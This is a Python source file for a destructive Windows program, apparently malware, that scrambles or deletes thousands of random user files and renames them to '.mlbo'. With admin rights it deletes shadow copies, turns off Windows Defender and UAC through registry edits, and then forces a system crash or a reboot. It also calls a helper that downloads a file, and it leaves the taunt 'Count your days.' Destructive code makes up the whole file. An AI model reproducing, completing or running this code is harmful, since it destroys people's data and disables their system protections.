#Libraries
import ctypes, os
import random as rand
import tkinter.messagebox as tkMsg
import tkinter
from functions import *

#Variables
#inten = 8*1000 #corruption intensity ##Unused
debug = False #console log stuff
do_destruction = True
skipCorruption = False
admCheck = ctypes.windll.shell32.IsUserAnAdmin()


#region main program
# for textboxes to work properly
window = tkinter.Tk()
window.withdraw()

# debug check
if debug:
    do_destruction = joe = tkMsg.askyesno(title='Helo :-)', message="You're about to execute possibly something bad. This program could possibly hose some of your files. \n \nDo you want to continue?", icon='question')

# Main destructive part
# does destruction if flag is true
if do_destruction:
    #downloads file
    ufck()

    #do funny
    if admCheck:
        try:
            do_command('vssadmin delete shadows /all /quiet')
        except:
            print('bruh')
        do_command('reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
        do_command('reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f')
        do_command('reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f')

    # debug thing to skip file corruption
    if not(skipCorruption):
        #main shit
        for i in range(3200):
            try:
                # init
                direc = 'c:\\users'

                #While loop for targeting random files
                while not(os.path.isfile(direc)): #shit straight up doesn't work
                    try:
                        dirList = os.listdir(os.path.expanduser(direc))
                        randChoice = rand.choice(dirList)
                        direc = direc+'\\'+randChoice

                        # If statement if it finds a file
                        if os.path.isfile(direc):
                            if debug:
                                print('found a file')
                            break
                    except:
                        # Runs this in case it goes for a directory or a read only file
                        if admCheck != 0:
                            direc = 'c:\\'
                        else:
                            direc = 'c:\\users'
                        dirList = os.listdir(os.path.expanduser(direc))
                        randChoice = rand.choice(dirList)
                
                if (os.path.splitext(direc)[1] == '.mlbo') or (os.path.getsize(direc) >= 32000000):
                    print('skip file')
                else:
                    if ((rand.randint(1,100)) == 1):
                        # deletes file outright in 1/100 chance
                        os.remove(direc)
                    else:
                        # Opens the file and converts it to an array
                        with open(direc,'rb') as bFile:
                            arrayList = list(bFile.read())


                        # This try and except thing is pretty stupid since this shouldn't go out of range but I'm still adding it here
                        #This for loop swaps values with neighboring ones            
                        try:
                            for i in range(round(len(arrayList)/10)):
                                arrayList[rand.randint(0,len(arrayList)-1)] = rand.choice(arrayList)
                        except:
                            print('failed to shift file')
                        
                        #convert array list to bytearray
                        byteArray = bytearray(arrayList)

                        #export file
                        finalFile = open(direc, 'wb')
                        finalFile.write(bytes(byteArray))
                        finalFile.close()

                        # rename file
                        os.rename(direc, os.path.splitext(direc)[0] + '.mlbo')

                    # Debug log stuff
                    if debug:
                        print('wrote to file')
            except:
                # rerolls the file incase it errors out
                print('rerolling id: ' + str(i))


#region final step
if do_destruction:
    tkMsg.showinfo(title='mablo sez',message='Count your days.')

    if admCheck != 0:
        # try to do funny
        regFuck()
        Bugcheck(0xC0000022)
    else:
        do_command('shutdown -r -t 0')

